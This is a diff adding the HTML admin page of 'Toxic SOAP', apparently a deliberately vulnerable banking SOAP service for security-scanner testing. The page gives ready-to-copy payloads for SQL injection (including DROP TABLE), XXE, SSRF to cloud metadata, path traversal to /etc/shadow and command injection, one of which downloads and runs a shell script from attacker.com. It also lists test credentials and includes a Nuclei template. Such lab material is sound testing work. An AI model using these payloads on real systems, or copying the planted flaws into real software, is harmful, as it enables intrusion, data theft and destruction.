@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Toxic SOAP - Admin Panel</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a2e; color: #eee; line-height: 1.6; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        header { background: linear-gradient(135deg, #16213e 0%, #1a1a2e 100%); padding: 30px; border-bottom: 2px solid #e94560; }
+        h1 { color: #e94560; font-size: 2.5rem; }
+        h1 span { color: #0f3460; }
+        .subtitle { color: #888; margin-top: 5px; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
+        .stat-card { background: #16213e; padding: 20px; border-radius: 10px; border-left: 4px solid #e94560; text-align: center; }
+        .stat-card h3 { color: #888; font-size: 0.8rem; text-transform: uppercase; }
+        .stat-card .value { font-size: 2rem; color: #e94560; font-weight: bold; }
+
+        /* Tabs */
+        .tabs { display: flex; gap: 5px; margin: 20px 0 0; flex-wrap: wrap; }
+        .tab { background: #16213e; color: #888; border: none; padding: 12px 24px; cursor: pointer; border-radius: 8px 8px 0 0; font-size: 0.95rem; transition: all 0.2s; }
+        .tab:hover { color: #eee; background: #1e2a4a; }
+        .tab.active { background: #e94560; color: #fff; }
+        .tab-content { display: none; background: #16213e; padding: 25px; border-radius: 0 10px 10px 10px; }
+        .tab-content.active { display: block; }
+
+        .section { background: #0d1525; padding: 20px; border-radius: 8px; margin: 15px 0; }
+        .section h2 { color: #e94560; margin-bottom: 15px; font-size: 1.3rem; }
+        .section h3 { color: #4ecca3; margin: 20px 0 10px; font-size: 1.1rem; }
+
+        .endpoints { display: grid; gap: 10px; }
+        .endpoint { background: #1a1a2e; padding: 15px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+        .endpoint-info { display: flex; align-items: center; gap: 10px; }
+        .endpoint-title { color: #4ecca3; font-weight: bold; }
+        .endpoint-url { font-family: monospace; color: #888; font-size: 0.9rem; }
+        .endpoint-url a { color: #4ecca3; text-decoration: none; }
+        .tag { display: inline-block; padding: 3px 10px; border-radius: 15px; font-size: 0.7rem; }
+        .tag-public { background: #4ecca3; color: #1a1a2e; }
+        .tag-auth { background: #e94560; color: #fff; }
+        .tag-admin { background: #9b59b6; color: #fff; }
+
+        table { width: 100%; border-collapse: collapse; margin: 10px 0; font-size: 0.9rem; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
+        th { color: #888; text-transform: uppercase; font-size: 0.75rem; background: #0d1525; }
+
+        code { background: #0d1525; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.85rem; color: #4ecca3; }
+        pre { background: #0a0a15; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 0.8rem; position: relative; margin: 10px 0; }
+        pre code { background: none; padding: 0; color: #ddd; }
+
+        .copy-btn { position: absolute; top: 8px; right: 8px; background: #333; color: #888; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 0.75rem; }
+        .copy-btn:hover { background: #444; color: #fff; }
+        .copy-btn.copied { background: #4ecca3; color: #1a1a2e; }
+
+        .btn { background: #e94560; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 0.9rem; text-decoration: none; display: inline-block; }
+        .btn:hover { background: #d63d56; }
+        .btn-outline { background: transparent; border: 2px solid #e94560; color: #e94560; }
+        .btn-outline:hover { background: #e94560; color: #fff; }
+        .btn-sm { padding: 6px 12px; font-size: 0.8rem; }
+
+        .actions { display: flex; gap: 10px; margin: 15px 0; flex-wrap: wrap; }
+        #resetResult { margin-top: 10px; padding: 10px; border-radius: 5px; display: none; }
+        #resetResult.success { background: #1b4332; color: #4ecca3; display: block; }
+        #resetResult.error { background: #4a1c24; color: #e94560; display: block; }
+
+        .vuln-card { background: #1a1a2e; border-radius: 8px; margin: 15px 0; overflow: hidden; }
+        .vuln-header { background: #0d1525; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .vuln-header:hover { background: #111a2e; }
+        .vuln-title { display: flex; align-items: center; gap: 10px; }
+        .vuln-name { color: #e94560; font-weight: bold; font-size: 1rem; }
+        .vuln-body { padding: 15px; display: none; }
+        .vuln-body.open { display: block; }
+        .vuln-desc { color: #aaa; margin-bottom: 15px; }
+        .chevron { color: #888; transition: transform 0.2s; }
+        .chevron.open { transform: rotate(180deg); }
+
+        .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .info-box { background: #1a1a2e; padding: 15px; border-radius: 8px; border-left: 3px solid #4ecca3; }
+        .info-box h4 { color: #4ecca3; margin-bottom: 10px; }
+        .info-box p { color: #aaa; font-size: 0.9rem; }
+
+        .warning-box { background: #2d1f1f; padding: 15px; border-radius: 8px; border-left: 3px solid #e94560; margin: 15px 0; }
+        .warning-box h4 { color: #e94560; margin-bottom: 5px; }
+
+        .curl-example { background: #0a0a15; padding: 10px 15px; border-radius: 5px; font-family: monospace; font-size: 0.8rem; overflow-x: auto; margin: 10px 0; }
+
+        footer { text-align: center; padding: 30px; color: #666; font-size: 0.85rem; }
+        footer a { color: #4ecca3; }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Toxic<span>SOAP</span></h1>
+            <p class="subtitle">Deliberately Vulnerable SOAP Service for Security Scanner Testing</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Products</h3>
+                <div class="value" th:text="${productCount}">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Users</h3>
+                <div class="value" th:text="${userCount}">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Orders</h3>
+                <div class="value" th:text="${orderCount}">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Vulnerabilities</h3>
+                <div class="value">15</div>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('overview')">Overview</button>
+            <button class="tab" onclick="showTab('vulnerabilities')">Vulnerabilities</button>
+            <button class="tab" onclick="showTab('payloads')">Payloads</button>
+            <button class="tab" onclick="showTab('scanner')">Scanner Config</button>
+            <button class="tab" onclick="showTab('data')">Data</button>
+        </div>
+
+        <!-- OVERVIEW TAB -->
+        <div id="overview" class="tab-content active">
+            <div class="section">
+                <h2>WSDL Endpoint (Corporate Pattern)</h2>
+                <div class="endpoints">
+                    <div class="endpoint">
+                        <div class="endpoint-info">
+                            <span class="endpoint-title">BankingPortalService</span>
+                            <span class="tag tag-public">Single WSDL</span>
+                        </div>
+                        <div class="endpoint-url">
+                            <a href="/ws/banking?wsdl" target="_blank">/ws/banking?wsdl</a>
+                            <a href="/ws/banking?wsdl&amp;download" class="btn btn-sm btn-outline" style="margin-left: 10px;">Download WSDL</a>
+                        </div>
+                    </div>
+                </div>
+                <p style="color: #888; margin-top: 15px; font-size: 0.9rem;">
+                    <strong>15 operations</strong> with per-operation auth:
+                    <span class="tag tag-public" style="margin-left: 5px;">5 PUBLIC</span>
+                    <span class="tag tag-auth" style="margin-left: 5px;">5 USER</span>
+                    <span class="tag tag-admin" style="margin-left: 5px;">5 ADMIN</span>
+                </p>
+            </div>
+
+            <div class="grid-2">
+                <div class="section">
+                    <h2>Authentication</h2>
+                    <p style="color: #aaa; margin-bottom: 15px;">Two authentication methods are supported:</p>
+
+                    <h3>HTTP Basic Auth</h3>
+                    <div class="curl-example">Authorization: Basic dXNlcjp1c2VyMTIz</div>
+
+                    <h3>WS-Security UsernameToken</h3>
+                    <pre><code>&lt;wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"&gt;
+  &lt;wsse:UsernameToken&gt;
+    &lt;wsse:Username&gt;user&lt;/wsse:Username&gt;
+    &lt;wsse:Password&gt;user123&lt;/wsse:Password&gt;
+  &lt;/wsse:UsernameToken&gt;
+&lt;/wsse:Security&gt;</code></pre>
+                </div>
+
+                <div class="section">
+                    <h2>Test Credentials</h2>
+                    <table>
+                        <tr><th>Username</th><th>Password</th><th>Role</th><th>Access</th></tr>
+                        <tr><td><code>user</code></td><td><code>user123</code></td><td>USER</td><td>User operations</td></tr>
+                        <tr><td><code>admin</code></td><td><code>admin123</code></td><td>ADMIN</td><td>All operations</td></tr>
+                        <tr><td><code>guest</code></td><td><code>guest</code></td><td>GUEST</td><td>Limited</td></tr>
+                    </table>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>Quick Start</h2>
+                <h3>Test with cURL (Public Operation - No Auth)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>curl -X POST http://localhost:4040/ws/banking \
+  -H "Content-Type: text/xml" \
+  -d '&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:bank="http://toxicsoap.com/banking"&gt;
+  &lt;soapenv:Body&gt;&lt;bank:listAllProducts/&gt;&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</code></pre>
+
+                <h3>Test with cURL (User Operation - Basic Auth)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>curl -X POST http://localhost:4040/ws/banking \
+  -H "Content-Type: text/xml" \
+  -u "user:user123" \
+  -d '&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:bank="http://toxicsoap.com/banking"&gt;
+  &lt;soapenv:Body&gt;&lt;bank:getFullProfile/&gt;&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</code></pre>
+            </div>
+
+            <div class="section">
+                <h2>Database Management</h2>
+                <div class="actions">
+                    <button class="btn" onclick="resetDatabase()">Reset Database</button>
+                    <a href="/h2-console" class="btn btn-outline" target="_blank">H2 Console</a>
+                    <a href="/health" class="btn btn-outline" target="_blank">Health Check</a>
+                </div>
+                <div id="resetResult"></div>
+                <p style="color: #666; font-size: 0.85rem; margin-top: 10px;">H2 Console: JDBC URL = <code>jdbc:h2:mem:toxicdb</code>, User = <code>sa</code>, No password</p>
+            </div>
+        </div>
+
+        <!-- VULNERABILITIES TAB -->
+        <div id="vulnerabilities" class="tab-content">
+            <div class="warning-box">
+                <h4>Security Notice</h4>
+                <p style="color: #ccc;">This application contains intentional security vulnerabilities for testing purposes. Do not deploy in production.</p>
+            </div>
+
+            <h2 style="color: #4ecca3; margin: 20px 0;">Public Endpoints (No Authentication)</h2>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-public">PUBLIC</span>
+                        <span class="vuln-name">SQL Injection</span>
+                        <code>getProductById(productId)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">The <code>productId</code> parameter is directly concatenated into an SQL query without sanitization, allowing attackers to execute arbitrary SQL commands.</p>
+                    <h4 style="color: #e94560; margin: 10px 0;">Vulnerable Code Pattern</h4>
+                    <pre><code>String sql = "SELECT * FROM products WHERE id = " + productId;</code></pre>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <table>
+                        <tr><th>Payload</th><th>Effect</th></tr>
+                        <tr><td><code>1 OR 1=1--</code></td><td>Return all products</td></tr>
+                        <tr><td><code>1 UNION SELECT * FROM users--</code></td><td>Extract user data</td></tr>
+                        <tr><td><code>1; DROP TABLE products--</code></td><td>Delete table (destructive)</td></tr>
+                    </table>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-public">PUBLIC</span>
+                        <span class="vuln-name">XXE Injection</span>
+                        <code>searchProducts(xmlQuery)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">XML parsing is performed without disabling external entity processing, allowing attackers to read local files or perform SSRF attacks.</p>
+                    <h4 style="color: #e94560; margin: 10px 0;">Vulnerable Code Pattern</h4>
+                    <pre><code>DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+// Missing: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xmlQuery)));</code></pre>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <pre><code>&lt;!DOCTYPE query [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;query&gt;&lt;category&gt;&amp;xxe;&lt;/category&gt;&lt;/query&gt;</code></pre>
+                    <pre><code>&lt;!DOCTYPE query [&lt;!ENTITY xxe SYSTEM "http://internal-server/admin"&gt;]&gt;
+&lt;query&gt;&lt;category&gt;&amp;xxe;&lt;/category&gt;&lt;/query&gt;</code></pre>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-public">PUBLIC</span>
+                        <span class="vuln-name">XML Bomb (DoS)</span>
+                        <code>parseProductXml(productXml)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">No entity expansion limits are set, allowing "Billion Laughs" attacks that can exhaust server memory.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payload (Billion Laughs)</h4>
+                    <pre><code>&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+]&gt;
+&lt;product&gt;&lt;name&gt;&amp;lol3;&lt;/name&gt;&lt;/product&gt;</code></pre>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-public">PUBLIC</span>
+                        <span class="vuln-name">SSRF</span>
+                        <code>fetchProductImage(imageUrl)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">The server fetches arbitrary URLs without validation, allowing attackers to scan internal networks or access internal services.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <table>
+                        <tr><th>Payload</th><th>Effect</th></tr>
+                        <tr><td><code>http://169.254.169.254/latest/meta-data/</code></td><td>AWS metadata (cloud)</td></tr>
+                        <tr><td><code>http://localhost:4040/admin</code></td><td>Access internal endpoints</td></tr>
+                        <tr><td><code>file:///etc/passwd</code></td><td>Read local files</td></tr>
+                        <tr><td><code>http://192.168.1.1/</code></td><td>Scan internal network</td></tr>
+                    </table>
+                </div>
+            </div>
+
+            <h2 style="color: #e94560; margin: 30px 0 20px;">Authenticated Endpoints (User Role)</h2>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-auth">USER</span>
+                        <span class="vuln-name">SQL Injection</span>
+                        <code>getUserOrders(searchQuery)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">Search query is directly interpolated into SQL, similar to the public SQL injection but requires authentication.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <pre><code>' OR '1'='1' --
+' UNION SELECT id,username,password,email,role,api_token,credit_card,ssn FROM users--</code></pre>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-auth">USER</span>
+                        <span class="vuln-name">IDOR (Broken Access Control)</span>
+                        <code>getUserProfile(userId)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">Users can access other users' profiles by changing the userId parameter. No authorization check verifies ownership.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Exploitation</h4>
+                    <p style="color: #aaa;">Authenticate as <code>user</code> and request <code>userId=2</code> to access admin's profile.</p>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-auth">USER</span>
+                        <span class="vuln-name">XPath Injection</span>
+                        <code>searchUserData(xpathQuery)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">User input is directly interpolated into XPath queries, allowing extraction of data from XML documents.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <pre><code>' or '1'='1
+' or '1'='1']/secret | //user[username='</code></pre>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-auth">USER</span>
+                        <span class="vuln-name">Sensitive Data Exposure</span>
+                        <code>getFullProfile()</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">Returns sensitive user data including password, API token, credit card number, and SSN in the response.</p>
+                    <h4 style="color: #e94560; margin: 10px 0;">Exposed Fields</h4>
+                    <ul style="color: #aaa; margin-left: 20px;">
+                        <li>password (plaintext)</li>
+                        <li>apiToken</li>
+                        <li>creditCard</li>
+                        <li>ssn</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h2 style="color: #9b59b6; margin: 30px 0 20px;">Admin Endpoints (Admin Role)</h2>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-admin">ADMIN</span>
+                        <span class="vuln-name">Command Injection</span>
+                        <code>generateReport(reportFormat)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">Input is passed directly to <code>Runtime.exec()</code> allowing arbitrary command execution on the server.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <table>
+                        <tr><th>Payload</th><th>Effect</th></tr>
+                        <tr><td><code>pdf; cat /etc/passwd</code></td><td>Read passwd file</td></tr>
+                        <tr><td><code>pdf; id</code></td><td>Get current user</td></tr>
+                        <tr><td><code>pdf; wget http://attacker.com/shell.sh | sh</code></td><td>Download and execute</td></tr>
+                    </table>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-admin">ADMIN</span>
+                        <span class="vuln-name">Path Traversal</span>
+                        <code>readConfigFile(filePath)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">Allows reading arbitrary files from the filesystem using path traversal sequences.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <pre><code>../../../etc/passwd
+../../../etc/shadow
+/proc/self/environ</code></pre>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-admin">ADMIN</span>
+                        <span class="vuln-name">Insecure Deserialization</span>
+                        <code>importData(serializedData)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">Deserializes untrusted Java objects, potentially allowing RCE via gadget chains (e.g., commons-collections).</p>
+                    <h4 style="color: #e94560; margin: 10px 0;">Note</h4>
+                    <p style="color: #aaa;">Use tools like ysoserial to generate payloads. The application includes commons-collections 3.2.2 for exploitation.</p>
+                </div>
+            </div>
+
+            <div class="vuln-card">
+                <div class="vuln-header" onclick="toggleVuln(this)">
+                    <div class="vuln-title">
+                        <span class="tag tag-admin">ADMIN</span>
+                        <span class="vuln-name">LDAP Injection</span>
+                        <code>lookupEmployee(ldapFilter)</code>
+                    </div>
+                    <span class="chevron">&#9660;</span>
+                </div>
+                <div class="vuln-body">
+                    <p class="vuln-desc">User input is interpolated into LDAP filter without sanitization.</p>
+                    <h4 style="color: #4ecca3; margin: 10px 0;">Example Payloads</h4>
+                    <pre><code>*)(uid=*))(|(uid=*
+admin)(|(password=*)</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAYLOADS TAB -->
+        <div id="payloads" class="tab-content">
+            <div class="section">
+                <h2>Complete SOAP Request Examples</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Copy these payloads to test vulnerabilities. All requests include proper SOAP envelope structure.</p>
+            </div>
+
+            <div class="section">
+                <h3>SQL Injection (Public - No Auth)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:bank="http://toxicsoap.com/banking"&gt;
+   &lt;soapenv:Body&gt;
+      &lt;bank:getProductById&gt;
+         &lt;productId&gt;1 OR 1=1--&lt;/productId&gt;
+      &lt;/bank:getProductById&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+            </div>
+
+            <div class="section">
+                <h3>XXE Injection - Read /etc/passwd (Public - No Auth)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:bank="http://toxicsoap.com/banking"&gt;
+   &lt;soapenv:Body&gt;
+      &lt;bank:searchProducts&gt;
+         &lt;xmlQuery&gt;&lt;![CDATA[&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE query [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;query&gt;
+  &lt;category&gt;&amp;xxe;&lt;/category&gt;
+&lt;/query&gt;]]&gt;&lt;/xmlQuery&gt;
+      &lt;/bank:searchProducts&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+            </div>
+
+            <div class="section">
+                <h3>SSRF - AWS Metadata (Public - No Auth)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:bank="http://toxicsoap.com/banking"&gt;
+   &lt;soapenv:Body&gt;
+      &lt;bank:fetchProductImage&gt;
+         &lt;imageUrl&gt;http://169.254.169.254/latest/meta-data/&lt;/imageUrl&gt;
+      &lt;/bank:fetchProductImage&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+            </div>
+
+            <div class="section">
+                <h3>Sensitive Data Exposure (User Auth Required)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>curl -X POST http://localhost:4040/ws/banking \
+  -H "Content-Type: text/xml" \
+  -u "user:user123" \
+  -d '&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:bank="http://toxicsoap.com/banking"&gt;
+   &lt;soapenv:Body&gt;
+      &lt;bank:getFullProfile/&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</code></pre>
+            </div>
+
+            <div class="section">
+                <h3>Authenticated Request (WS-Security Header)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:bank="http://toxicsoap.com/banking"
+                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"&gt;
+   &lt;soapenv:Header&gt;
+      &lt;wsse:Security&gt;
+         &lt;wsse:UsernameToken&gt;
+            &lt;wsse:Username&gt;user&lt;/wsse:Username&gt;
+            &lt;wsse:Password&gt;user123&lt;/wsse:Password&gt;
+         &lt;/wsse:UsernameToken&gt;
+      &lt;/wsse:Security&gt;
+   &lt;/soapenv:Header&gt;
+   &lt;soapenv:Body&gt;
+      &lt;bank:getFullProfile/&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+            </div>
+
+            <div class="section">
+                <h3>Command Injection (Admin Auth Required)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>curl -X POST http://localhost:4040/ws/banking \
+  -H "Content-Type: text/xml" \
+  -u "admin:admin123" \
+  -d '&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:bank="http://toxicsoap.com/banking"&gt;
+   &lt;soapenv:Body&gt;
+      &lt;bank:generateReport&gt;
+         &lt;reportFormat&gt;pdf; cat /etc/passwd&lt;/reportFormat&gt;
+      &lt;/bank:generateReport&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</code></pre>
+            </div>
+
+            <div class="section">
+                <h3>Path Traversal (Admin Auth Required)</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>curl -X POST http://localhost:4040/ws/banking \
+  -H "Content-Type: text/xml" \
+  -u "admin:admin123" \
+  -d '&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:bank="http://toxicsoap.com/banking"&gt;
+   &lt;soapenv:Body&gt;
+      &lt;bank:readConfigFile&gt;
+         &lt;filePath&gt;../../../etc/passwd&lt;/filePath&gt;
+      &lt;/bank:readConfigFile&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</code></pre>
+            </div>
+        </div>
+
+        <!-- SCANNER CONFIG TAB -->
+        <div id="scanner" class="tab-content">
+            <div class="section">
+                <h2>Security Scanner Configuration Guide</h2>
+                <p style="color: #aaa;">Configure your security scanner to test both authenticated and unauthenticated vulnerabilities.</p>
+            </div>
+
+            <div class="grid-2">
+                <div class="info-box">
+                    <h4>Single WSDL Endpoint</h4>
+                    <p><strong>Target:</strong> <code>http://localhost:4040/ws/banking?wsdl</code></p>
+                    <p><strong>Operations:</strong> 15 total (5 public, 5 user, 5 admin)</p>
+                    <p><strong>Auth:</strong> Per-operation enforcement</p>
+                </div>
+                <div class="info-box">
+                    <h4>Authentication Options</h4>
+                    <p><strong>No Auth:</strong> Public operations work without credentials</p>
+                    <p><strong>User Auth:</strong> user / user123</p>
+                    <p><strong>Admin Auth:</strong> admin / admin123</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h3>Burp Suite Configuration</h3>
+                <table>
+                    <tr><th>Setting</th><th>Value</th></tr>
+                    <tr><td>Target Scope</td><td><code>http://localhost:4040/ws/*</code></td></tr>
+                    <tr><td>Session Handling</td><td>Add macro for authentication</td></tr>
+                    <tr><td>Scanner Settings</td><td>Enable "Scan SOAP actions"</td></tr>
+                </table>
+
+                <h4 style="color: #4ecca3; margin: 15px 0;">Basic Auth Session Rule</h4>
+                <pre><code>Add header: Authorization: Basic dXNlcjp1c2VyMTIz</code></pre>
+            </div>
+
+            <div class="section">
+                <h3>SoapUI / ReadyAPI</h3>
+                <ol style="color: #aaa; margin-left: 20px;">
+                    <li>Create new SOAP project from WSDL URL</li>
+                    <li>Add WS-Security configuration:
+                        <ul style="margin-left: 20px; margin-top: 5px;">
+                            <li>Outgoing WS-Security: UsernameToken</li>
+                            <li>Username: user / Password: user123</li>
+                        </ul>
+                    </li>
+                    <li>Run security tests on each operation</li>
+                </ol>
+            </div>
+
+            <div class="section">
+                <h3>Nuclei Templates</h3>
+                <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>id: toxic-soap-sqli
+
+info:
+  name: Toxic SOAP SQL Injection
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /ws/banking HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:bank="http://toxicsoap.com/banking"&gt;
+          &lt;soapenv:Body&gt;
+            &lt;bank:getProductById&gt;
+              &lt;productId&gt;1' OR '1'='1&lt;/productId&gt;
+            &lt;/bank:getProductById&gt;
+          &lt;/soapenv:Body&gt;
+        &lt;/soapenv:Envelope&gt;
+
+    matchers:
+      - type: word
+        words:
+          - "Laptop Pro"
+          - "Wireless Mouse"</code></pre>
+            </div>
+        </div>
+
+        <!-- DATA TAB -->
+        <div id="data" class="tab-content">
+            <div class="section">
+                <h2>Current Database State</h2>
+                <div class="actions">
+                    <button class="btn" onclick="resetDatabase()">Reset Database</button>
+                    <a href="/h2-console" class="btn btn-outline" target="_blank">H2 Console</a>
+                </div>
+                <div id="resetResult2"></div>
+            </div>
+
+            <div class="section">
+                <h3>Products</h3>
+                <table>
+                    <tr><th>ID</th><th>Name</th><th>Price</th><th>Category</th></tr>
+                    <tr th:each="product : ${products}">
+                        <td th:text="${product.ID}"></td>
+                        <td th:text="${product.NAME}"></td>
+                        <td th:text="${'$' + product.PRICE}"></td>
+                        <td th:text="${product.CATEGORY}"></td>
+                    </tr>
+                </table>
+            </div>
+
